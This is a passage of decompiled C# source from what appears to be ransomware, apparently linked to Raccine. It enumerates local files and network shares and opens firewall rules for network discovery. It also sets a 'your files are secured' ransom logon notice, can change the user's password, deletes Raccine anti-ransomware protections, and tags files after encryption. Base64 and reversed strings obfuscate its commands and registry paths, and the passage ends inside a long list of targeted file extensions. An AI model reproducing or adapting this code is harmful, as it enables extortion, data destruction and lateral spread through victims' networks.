!item.FullName.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("Инструкция") && !item.FullName.EndsWith(".mxf1bd") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll")) || item.FullName.Contains(Base64Decode("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI=")))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && Size == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if ((directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains(":\\windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata")) && !directoryInfo.FullName.Contains(Base64Decode("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI=")))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("Инструкция") && !item3.FullName.EndsWith(".mxf1bd") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && Size == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
		}
		catch (DirectoryNotFoundException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (PathTooLongException)
		{
		}
		catch
		{
		}
		return list;
	}

	public static void AddShares()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!DizonList.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					DizonList.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string ProcessCommand(string command = "", string arguments = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = command,
				Arguments = arguments,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void RunPS(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string ReverseString(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void SetKey(string keyPath = "", string LegalNoticeCaption = "SW5mb3JtYXRpb24uLi4=", string LegalNoticeText = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		keyPath = ReverseString("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(keyPath), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(Base64Decode("TGVnYWxOb3RpY2VDYXB0aW9u"), Base64Decode(LegalNoticeCaption));
				registryKey.SetValue(Base64Decode("TGVnYWxOb3RpY2VUZXh0"), Base64Decode(LegalNoticeText));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			keyPath = ReverseString("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(keyPath), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(Base64Decode("bGVnYWxub3RpY2VjYXB0aW9u"), Base64Decode(LegalNoticeCaption));
				registryKey.SetValue(Base64Decode("bGVnYWxub3RpY2V0ZXh0"), Base64Decode(LegalNoticeText));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void SetKeysIfAdmin()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (NotifyCustom == "YES" && !string.IsNullOrEmpty(LegalTitle) && !string.IsNullOrEmpty(LegalText))
				{
					SetKey("", LegalTitle, LegalText);
				}
				else
				{
					SetKey();
				}
			}
		}
		catch
		{
		}
	}

	public static void ShowNotification(string title = "SW5mb3JtYXRpb24uLi4=", string content = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(Base64Decode(title));
		val.set_BalloonTipText(Base64Decode(content));
		val.ShowBalloonTip(30000);
	}

	public static void ChangeWindowsUserPass(string password)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		ProcessCommand(Base64Decode("bmV0LmV4ZQ=="), "user " + text + " " + password);
	}

	public static List<string> GetSharedFoldersList()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementClass val = new ManagementClass("Win32_Share");
		List<string> list = new List<string>();
		try
		{
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					object obj = ((ManagementBaseObject)val2).get_Item("Name");
					if (!list.Contains("\\\\" + val2.get_Path().get_Server() + "\\" + obj.ToString()!.Replace("IPC$", "").Replace("ADMIN$", "")))
					{
						list.Add("\\\\" + val2.get_Path().get_Server() + "\\" + obj.ToString()!.Replace("IPC$", "").Replace("ADMIN$", ""));
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
		return list;
	}

	private static void MapDrv()
	{
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Expected O, but got Unknown
		//IL_024a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0251: Expected O, but got Unknown
		EnableNetworkDiscovery();
		List<IPInfo> iPInfo = IPInfo.GetIPInfo();
		foreach (IPInfo item in iPInfo)
		{
			Ip1.Add(item.IPAddress);
		}
		Parallel.ForEach(Ip1, delegate(string ip)
		{
			if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.StartsWith("")) && NetworkSpreading.PingHost(ip))
			{
				try
				{
					Thread.Sleep(sleeper);
					DizonList.Add("\\\\" + ip + "\\Users");
					try
					{
						if (ConsoleReport)
						{
							Console.WriteLine("\\\\" + ip + "\\Users");
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int g)
					{
						Thread.Sleep(sleeper);
						DizonList.Add("\\\\" + ip + "\\" + (char)g + "$");
						try
						{
							if (ConsoleReport)
							{
								Console.WriteLine("\\\\" + ip + "\\" + (char)g + "$");
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			}
		});
		try
		{
			NetworkSpreading.ServerEnum serverEnum = new NetworkSpreading.ServerEnum(NetworkSpreading.ResourceScope.RESOURCE_GLOBALNET, NetworkSpreading.ResourceType.RESOURCETYPE_ANY, NetworkSpreading.ResourceUsage.RESOURCEUSAGE_ALL, NetworkSpreading.ResourceDisplayType.RESOURCEDISPLAYTYPE_NETWORK);
			foreach (string item2 in serverEnum)
			{
				MatchCollection matchCollection = Regex.Matches(item2, "\\\\\\\\[a-zA-Z0-9\\.\\-_]{1,}(\\\\[a-zA-Z0-9\\-_]{1,}){1,}[\\$]{0,1}");
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!DizonList.Contains(item3.ToString()))
						{
							DizonList.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (ConsoleReport)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		GetServerShares.EnumerateServerShares();
		try
		{
			if (ConsoleReport)
			{
				Console.WriteLine("Network scanning completed...");
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string base64EncodedData = ReverseString("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(base64EncodedData), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(Base64Decode("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(Base64Decode("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (HorseMount == "YES")
		{
			VolumeFunctions.MountVolumes();
		}
		try
		{
			if (ConsoleReport)
			{
				Console.WriteLine("Scanning for manually mapped resources...");
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (DizonList.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (ConsoleReport)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
							.Replace("\"", "")
							.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
					}
				}
				catch
				{
				}
				DizonList.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (ConsoleReport)
			{
				Console.WriteLine("Scanning for manually mapped resources completed...");
			}
		}
		catch
		{
		}
	}

	public static bool Internet()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void Empowered(string command)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = Base64Decode("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + command;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool SetAccess(string user, string folder)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(user, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(folder);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(user, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool IsDriveNTFS(string path)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			string pathRoot = Path.GetPathRoot(path);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo d) => d.RootDirectory.Name == pathRoot);
			return driveInfo != null && driveInfo.DriveFormat == "NTFS";
		}
		catch
		{
			return false;
		}
	}

	public static string ToInsecureString(SecureString input)
	{
		string result = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(input);
		try
		{
			result = Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
		return result;
	}

	public static void TerminateSnooper()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string base64EncodedData = ReverseString("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(base64EncodedData), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(Base64Decode("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(Base64Decode("d21pYy5leGU="));
					registryKey.DeleteSubKey(Base64Decode("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(Base64Decode("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(Base64Decode("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(Base64Decode("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(Base64Decode("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				base64EncodedData = ReverseString("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(base64EncodedData), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(Base64Decode("UmFjY2luZQ=="));
					registryKey.Close();
				}
				base64EncodedData = ReverseString("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(base64EncodedData), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(Base64Decode("UmFjY2luZQ=="));
					registryKey.Close();
				}
				base64EncodedData = ReverseString("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(Base64Decode(base64EncodedData), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(Base64Decode("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			ProcessCommand(Base64Decode("dGFza2tpbGw="), Base64Decode("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			ProcessCommand(Base64Decode("cmVn"), Base64Decode(ReverseString("=Y0LgISehJHVgUmbpN2YhJlIgY1LgIib1JFXu9WazJXZWRnblJnc1NEXzd3bk5WaXxFdm92cvJ3Yp1EXFJVQXRlRPNFXVN0SIJCIlRXZsVGZ")));
			ProcessCommand(Base64Decode("cmVn"), Base64Decode("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			ProcessCommand(Base64Decode("c2NodGFza3M="), Base64Decode("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void WriteSignatureFullEncode(string filename, byte[] cryptPass)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(Base64Decode("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(filename, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(cryptPass, 0, cryptPass.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void EnableLong()
	{
		string base64EncodedData = ReverseString("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(base64EncodedData), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(Base64Decode("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void EnableNetworkDiscovery()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ProcessCommand(Base64Decode("bmV0c2g="), Base64Decode("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			ProcessCommand(Base64Decode("bmV0c2g="), Base64Decode("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJGaWxlIGFuZCBQcmludGVyIFNoYXJpbmdcIiBuZXcgZW5hYmxlPVllcw=="));
		}
	}

	public static void EncodeOnTheWay(string path)
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				TraverseTree(path, new string[4824]
				{
					"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
					"sdf", "nsf", "fp7", "cat", "log", "$$$", "$db", "$efs", "$er", "^^^",
					"__a", "__b", "{pb", "~cw", "~hm", "0", "000", "001", "1", "101",
					"103", "108", "110", "113", "123", "128", "17t", "1CD", "1pe", "1ph",
					"1sp", "1st", "2", "2mg", "2Q0", "2QM", "3", "3d", "3d4", "3dd",
					"3df", "3df8", "3dm", "3dmdef", "3dp", "3dr", "3ds", "3dt", "3dw", "3dxml",
					"3fr", "3g2", "3ga", "3gp", "3gp2", "3me", "3MF", "3mm", "3pe", "3pr",
					"3w", "4dd", "4dl", "4dv", "4fs", "4w7", "5vw", "602", "73b", "73c",
					"73l", "7z", "7z001", "7z002", "7zip", "8", "86f", "89t", "89y", "8ba",
					"8bc", "8be", "8bf", "8bi8", "8bl", "8bs", "8bx", "8by", "8li", "8svx",
					"8xg", "8xk", "8xs", "8xt", "8xv", "9xt", "9xy", "a$v", "a00", "a01",
					"a02", "a2c", "a5l", "a5w", "a65", "aa", "aa3", "aac", "aaf", "aah",
					"aam", "aao", "aaui", "ab", "ab1", "ab3", "ab4", "ab65", "aba", "abbu",
					"abc", "abcd", "abf", "abi", "abk", "abkprj", "abp", "abt", "abw", "aby",
					"ac2", "ac3", "ac5", "aca", "acc", "accdc", "accde", "accdr", "accdt", "accft",
					"ACCTB", "ace", "acf", "acg", "ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings",
					"acrodata", "acroplugin", "acrypt", "act", "acz", "ad", "ada", "adb", "adc", "adcp",
					"add", "addism", "ade", "adf", "adi", "adif", "adoc", "ados", "adox", "adp",
					"adpb", "adr", "ads", "adt", "adu", "adv", "advs", "adx", "adz", "aea",
					"aec", "aep", "aepx", "aes", "aet", "afd", "afdesign", "afe", "aff", "afi",
					"afm", "afp", "aft", "agd", "agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec",
					"age3xsav", "age3xscn", "age3yrec", "age3ysav", "age3yscn", "aggr", "ahf", "ai", "aif", "aifb",
					"aiff", "aim", "ain", "AIO", "aip", "ais", "ait", "ak", "al", "al8",
					"ala", "alb3", "alb4", "alb5", "alb6", "alc", "ald", "aldf", "alf", "ali",
					"allet", "alt3", "alt5", "alz", "AM", "amb", "amc", "amf", "aml", "amm",
					"amr", "amsorm", "amt", "amu", "amx", "amxx", "an1", "an8", "anime", "anl",
					"anme", "ann", "ans", "ansr", "ansym", "anx", "aoi", "ap", "apa", "apalbum",
					"apd", "ape", "apf", "aph", "api", "apj", "apk", "aplibrary", "apnx", "apo",
					"app", "APPCACHE", "approj", "APPX", "apr", "apt", "apw", "apxl", "apz", "ar",
					"arc", "arch00", "archiver", "arduboy", "arff", "ari", "arj", "arn", "aro", "arr",
					"ars", "art", "arw", "as", "as$", "as3", "asa", "asc", "ascm", "ascx",
					"asd", "ase", "asf", "ashbak", "ashdisc", "ashprj", "ashx", "ask", "asl", "asm",
					"asmx", "asn", "asnd", "asp", "aspx", "asr", "asset", "ast", "asv", "asvx",
					"asx", "atf", "ath", "atl", "atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux",
					"av", "avc", "avhd", "avhdx", "avj", "avl", "avn", "avp", "avs", "AW",
					"awb", "awbr", "awd", "awdb", "awe", "awg", "awp", "aws", "awt", "aww",
					"awwp", "ax", "azf", "azs", "azw", "azw1", "azw3", "azw4", "azz", "azzx",
					"b", "b1", "b27", "b2a", "b5i", "b5t", "b64", "b6i", "b6t", "b6z",
					"ba", "ba6", "ba7", "ba8", "ba9", "bac", "back", "backup", "backupdb", "bad",
					"bafl", "bak", "bak~", "bak2", "bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj",
					"bau", "bax", "bay", "bbb", "bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz",
					"bc", "bc5", "bc6", "bc7", "bcc", "bcd", "bci", "bck", "bckp", "bcl",
					"bcm", "bcp", "bct", "bdb", "bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp",
					"bdr", "bdt2", "bdt3", "bean", "bed", "bfa", "bff", "bfx", "bgl", "bgt",
					"bgv", "bh", "bho", "bi8", "bib", "bibtex", "bic", "bif", "bifx", "big",
					"bik", "bil", "bim", "bin", "bina", "binary", "bionix", "BIT", "bizdocument", "bjl",
					"bjo", "bk", "bk!", "bk1", "bk2", "bk3", "bk4", "bk5", "bk6", "bk7",
					"bk8", "bk9", "bkc", "bkf", "bkg", "bkp", "bks", "bkup", "bkz", "blb",
					"bld", "blend", "blend1", "blend2", "blg", "blk", "blm", "bln", "blob", "blockplt",
					"blogthis", "blp", "bluebutton", "bm2", "bm3", "bmc", "bmf", "bmk", "bml", "bmm",
					"bmml", "bmpr", "bms", "bna", "bndl", "bnk", "boc", "bok", "boo", "book",
					"bookexport", "bop", "box", "bp1", "bp2", "bp3", "bpa", "bpb", "bpd", "bpdx",
					"bpf", "bphys", "bpj", "bpk", "bpl", "bplx", "bpm", "bpmc", "bpn", "bps",
					"bpw", "brain", "brd", "breaking_bad", "brf", "brh", "brl", "brn", "BROWSER", "brs",
					"brw", "brx", "bsa", "bsd", "bsdl", "bsk", "bso", "bsp", "bst", "btd",
					"btf", "btif", "btinstall", "BTL", "btm", "btoa", "btr", "btx", "BUD", "bul",
					"bundle", "bup", "burn", "burntheme", "bvd", "bvp", "bwa", "bwd", "bwf", "bwi",
					"bwp", "bws", "bwt", "bwz", "BXF", "bxx", "bz", "bz2", "bza", "bzabw",
					"bzip", "bzip2", "c", "c00", "c01", "c02", "c10", "c2e", "c3d", "c4p",
					"c6", "cadoc", "cae", "caf", "cag", "calca", "cam", "camm", "camproj", "cap",
					"capt", "capx", "car", "caro", "cas", "catproduct", "cav", "cawr", "cb7", "cba",
					"cbf", "cbg", "cbmap", "cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc",
					"cca", "ccc", "ccd", "ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd",
					"cd1", "cd2", "cdb", "cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl",
					"cdm", "cdml", "cdmm", "cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5",
					"cdr6", "cdrw", "cds", "cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef",
					"cel", "celtx", "cenon~", "cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd",
					"cfg", "cfp", "cfr", "cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp",
					"chg", "chi", "chk", "chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht",
					"chtml", "cib", "cida", "cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9",
					"ckp", "ckt", "cl2", "cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist",
					"clb", "cld", "clg", "clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk",
					"clkv", "clm", "clp", "clr", "cls", "clx", "cm10", "cm5", "cma", "cmap",
					"CMB", "cmbl", "cmf", "cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna",
					"cnf", "cng", "cnt", "cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS",
					"compositionmodel", "compositiontemplate", "con", "conf", "config", "contact", "converterx", "cp", "cp9", "CPA",
					"cpaa", "cpc", "cpd", "cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk",
					"cpmz", "cpp", "cpt", "cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb",
					"crd", "crds", "creole", "crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr",
					"crtx", "crw", "crwl", "cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall",
					"cryptra", "cs", "cs8", "csa", "csd", "cse", "CSG", "csh", "csi", "csl",
					"csm", "cso", "csp", "csr", "css", "cst", "csv", "ctb", "ctbl", "ctd",
					"cte", "ctf", "CTG", "ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3",
					"ctx", "ctxt", "cty", "cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva",
					"cvd", "cvj", "cvl", "cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr",
					"cws", "cww", "cwwp", "cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi",
					"cyo", "cys", "czi", "czip", "czp", "d", "d00", "d01", "d3dbsp", "d64",
					"d88", "da0", "da2", "daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf",
					"dag", "dal", "dam", "dao", "dap", "dar", "das", "daschema", "dash", "dat",
					"DATA", "database", "datx", "dax", "dayzprofile", "dazip", "db_journal", "db0", "db3", "dba",
					"dbb", "dbc", "dbcrypt12", "dbcrypt8", "dbd", "DBF", "dbfv", "dbgsym", "db-journal", "dbk",
					"dbr", "dbs", "db-shm", "dbt", "dbv", "db-wal", "dc2", "dc4", "dca", "dcb",
					"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
					"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
					"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
					"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
					"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
					"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
					"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
